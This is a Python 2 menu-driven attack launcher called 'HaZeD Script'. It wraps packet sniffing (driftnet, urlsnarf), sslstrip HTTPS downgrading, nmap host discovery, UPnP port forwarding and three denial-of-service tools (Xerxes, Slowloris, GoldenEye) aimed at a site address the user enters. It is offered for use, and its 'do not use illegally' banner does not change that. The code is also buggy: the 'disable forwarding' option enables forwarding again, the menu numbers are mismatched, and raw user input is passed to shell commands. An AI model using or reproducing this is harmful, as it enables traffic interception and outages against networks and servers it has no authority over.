import sys,os,time
import smtplib
from colorama import *
def logo():
	logo =""" ___ ___       _______       ______    ___ ___            __    __ 
|  Y   .---.-|   _   .-----|   _  \  |   Y   .-----.----|  .--|  |
|.  1   |  _  |___|   |  -__|.  |   \ |.  |   |  _  |   _|  |  _  |
|.  _   |___._|/  ___/|_____|.  |    \|. / \  |_____|__| |__|_____|
|:  |   |     |:  1  \      |:  1    /|:      |                    
|::.|:. |     |::.. . |     |::.. . / |::.|:. |                    
`--- ---'     `-------'     `------'  `--- ---'                    """

	print (Fore.BLUE + logo + Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.GREEN+" |+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x| "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"             x|Welcome To HaZeD Script.|x              "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"              x|DONOT USE THIS ILLEGALY|x               "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                x|xMade In 3/1/2018.x|x                 "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                  x|Pentesting Tool.|x                  "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                    x|Version 1.0|x                     "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.RED+"                      x|by HaZeD|x                      "+Style.RESET_ALL)
	time.sleep(0.02)
	print (Fore.GREEN+" |+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x| "+Style.RESET_ALL)
ko=("/24")
ko2=("TCP")
pport=(" 80")
def clearo():
	os.system("clear")
def usr():
	clearo()
	logo()
	print (Fore.YELLOW+"						Hints"+Style.RESET_ALL)
	print (Fore.BLUE+" 1)"+Style.RESET_ALL+" Enable Forwarding Packets.    "+Fore.CYAN+" (Recomended before starting the attack.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 2)"+Style.RESET_ALL+" Disable Forwarding Packets.    "+Fore.CYAN+"(Disable before quitting.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 3)"+Style.RESET_ALL+" Wifi attacks.                 "+Fore.CYAN+"(Sniffing packets and etc...)"+Style.RESET_ALL)
	print (Fore.BLUE+" 4)"+Style.RESET_ALL+" PortForwarding.               "+Fore.CYAN+"(Easy , without router admin password.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 5)"+Style.RESET_ALL+" DDos attacks.       "+Fore.CYAN+"	    (It takes the server down.)"+Style.RESET_ALL)
	print (Fore.BLUE+" 6)"+Style.RESET_ALL+" Buy me a coffee."+Fore.CYAN+"             (Your name will be listed in the script) ")
	print (Fore.BLUE+" 0)"+Style.RESET_ALL+" Exit.")
	try:
		usr2 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr2 == ("1") :
		One()
	elif usr2 == ("2") :
		Two()
	elif usr2 == ("3") :
		Three()
	elif usr2 == ("4") :
		Five()
	elif usr2 == ("5") :
		Six()
	elif usr2 == ("7") :
		Seven()
	elif usr2 == ("0") :
		quit()
	else :
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def One():
	try:
		os.system("xterm -e 'sysctl -w net.ipv4.ip_forward=1'")
		clearo()
		print ("Forwarding Packets"+Fore.GREEN+" ON!"+Style.RESET_ALL)
		time.sleep(1.3)
		usr()
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
def Two():
	try:
		os.system("xterm -e 'sysctl -w net.ipv4.ip_forward=1'")
		clearo()
		print ("Forwarding Packets"+Fore.RED+" OFF!"+Style.RESET_ALL)
		time.sleep(1.4)
		usr()
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
def Three():
	clearo()
	logo()
	print (Fore.YELLOW+"				     	Hints	"+Style.RESET_ALL)
	print (Fore.BLUE+"1)"+Style.RESET_ALL+" Sniffing with Driftnet.       "+Fore.CYAN+" (Captures Pictures.)"+Style.RESET_ALL)
	print (Fore.BLUE+"2)"+Style.RESET_ALL+" Sniffing with UrlSnarf.       "+Fore.CYAN+"  (Catches URLes.)"+Style.RESET_ALL)
	print (Fore.BLUE+"3)"+Style.RESET_ALL+" Detect Wifi Users.     "+Fore.CYAN+"   (By IP and OS detection.)"+Style.RESET_ALL)
	print (Fore.BLUE+"4)"+Style.RESET_ALL+" SSlstrip."+Fore.CYAN+"			(Redirects HTTPS To HTTP.)"+Style.RESET_ALL)
	print (Fore.BLUE+"99)"+Style.RESET_ALL+" Back to main menu.	"+Fore.CYAN+"	(Or Press <Enter>)"+Style.RESET_ALL)
	try:
		usr1 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr1 == ("1"):
		os.system("xterm -e 'driftnet -i '"+interface)
		Three()
	elif usr1 == ("2"):
		os.system("xterm -e 'urlsnarf -i '"+interface)
		Three()
	elif usr1 == ("3"):
		os.system("xterm -hold -e 'nmap -sP '"+gateway+ko)
		Three()
	elif usr1 == ("4"):
		os.system("xterm -e 'sslstrip -l 8080'")
		Three()
	elif usr1 == ("99"):
		usr()
	else:
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def Five():
	clearo()
	logo()
	try:
		os.system("xterm -e 'sudo apt-get install miniupnpc'")
	except:
		Five()
	print (Fore.WHITE+"Needed Things are installed successfully."+Style.RESET_ALL)
	try:
		yourip=raw_input(Fore.MAGENTA+"Enter your Internel IP address: "+Style.RESET_ALL)
		yourport=raw_input(Fore.MAGENTA+"Enter the port you want to forward: "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	os.system("upnpc -a "+yourip +" " + yourport +" "+ yourport+" " + ko2)
	clearo()
	print (Fore.GREEN+"The port is forwarded successfully!"+Style.RESET_ALL)
	time.sleep(2)
	usr()
def Six():
	clearo()
	logo()
	print (Fore.YELLOW+"						Hints				"+Style.RESET_ALL)
	print (Fore.BLUE+"1)"+Style.RESET_ALL+"DDos attack with Xerxes."+Fore.CYAN+"   		(Most Powerfull Tool.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"2)"+Style.RESET_ALL+"DDos attack with Slowloris."+Fore.CYAN+"   	(Powerfull Tool.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"3)"+Style.RESET_ALL+"DDos attack with GoldenEye."+Fore.CYAN+"   	(You must copy the full URL.)	"+Style.RESET_ALL)
	print (Fore.BLUE+"99)"+Style.RESET_ALL+" Back to main menu.	"+Fore.CYAN+"		(Or Press <Enter>)"+Style.RESET_ALL)
	try:
		usr3 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
	except KeyboardInterrupt:
		clearo()
		print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
		print (Fore.RED+"Exiting....."+Style.RESET_ALL)
		time.sleep(1.3)
		quit()
	if usr3 == ("1"):
		try:
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		os.system("cd /root/HaZeDScript2/Tools && ./xerxes "+atsite+pport)
		Six()
	elif usr3 == ("2") :
		try:
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		os.system("cd /root/HaZeDScript2/Tools && perl slowloris.pl -dns "+atsite)
		Six()
	elif usr3 == ("3") :
		try:
			atsite=raw_input(Fore.MAGENTA+"Enter the address of the site : "+Style.RESET_ALL)
		except KeyboardInterrupt:
			clearo()
			print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
			print (Fore.RED+"Exiting....."+Style.RESET_ALL)
			time.sleep(1.3)
			quit()
		print (Fore.RED+"The URL Must contain 'http://' or 'https://' in the begining (Copy the Full URL from the search bar)"+Style.RESET_ALL)
		time.sleep(6)
		os.system("cd /root/HaZeDScript2/Tools/GoldenEye && ./goldeneye.py "+atsite)
		Six()
	elif usr3 == ("99") :
		usr()
	else :
		clearo()
		print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
		time.sleep(2)
		usr()
def Seven():
	try:
		os.system("firefox --browser paypal.me/DBeack")
		usr()
	except:
		os.system("xterm -e 'sudo apt-get install firefox'")
		usr()
def Download():
	os.system("xterm -e 'rmdir /root/HaZeDScript")
	os.system("cd /root && git clone https://github.com/drollbeack18100/HaZeDScript")
	usr()
clearo()
logo()
print ("Verfying some information.")
try:
	interface=raw_input(Fore.MAGENTA+"Enter your interface: "+Style.RESET_ALL)
	gateway=raw_input(Fore.MAGENTA+"Enter your gateway: "+Style.RESET_ALL)
except KeyboardInterrupt:
	clearo()
	logo()
	print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
	print (Fore.RED+"Exiting....."+Style.RESET_ALL)
	time.sleep(1.3)
	quit()
clearo()
logo()
print (Fore.YELLOW+"						Hints"+Style.RESET_ALL)
print (Fore.BLUE+" 1)"+Style.RESET_ALL+" Enable Forwarding Packets.    "+Fore.CYAN+" (Recomended before starting the attack.)"+Style.RESET_ALL)
print (Fore.BLUE+" 2)"+Style.RESET_ALL+" Disable Forwarding Packets.    "+Fore.CYAN+"(Disable before quitting.)"+Style.RESET_ALL)
print (Fore.BLUE+" 3)"+Style.RESET_ALL+" Wifi attacks.                 "+Fore.CYAN+"(Sniffing packets and etc...)"+Style.RESET_ALL)
print (Fore.BLUE+" 4)"+Style.RESET_ALL+" PortForwarding.               "+Fore.CYAN+"(Easy , without router admin password.)"+Style.RESET_ALL)
print (Fore.BLUE+" 5)"+Style.RESET_ALL+" DDos attacks.       "+Fore.CYAN+"	    (It takes the server down.)"+Style.RESET_ALL)
print (Fore.BLUE+" 6)"+Style.RESET_ALL+" Buy me a coffee."+Fore.CYAN+"             (Your name will be listed in the script) ")
print (Fore.BLUE+" 0)"+Style.RESET_ALL+" Exit.")
try:
	usr2 = raw_input(Fore.RED+"root@HaZeD"+Style.RESET_ALL+Fore.GREEN+":~ "+Style.RESET_ALL)
except KeyboardInterrupt:
	clearo()
	print (Fore.GREEN+"Thank You For Choosing HaZeD Script."+Style.RESET_ALL)
	print (Fore.RED+"Exiting....."+Style.RESET_ALL)
	time.sleep(1)
	quit()
if usr2 == ("1") :
	One()
elif usr2 == ("2") :
	Two()
elif usr2 == ("3") :
	Three()
elif usr2 == ("4") :
	Five()
elif usr2 == ("5") :
	Six()
elif usr2 == ("7") :
	Seven()
elif usr2 == ("0") :
	quit()
else :
	clearo()
	print (Fore.RED+"Please Choose From the list only."+Style.RESET_ALL)
	time.sleep(2)
	usr()
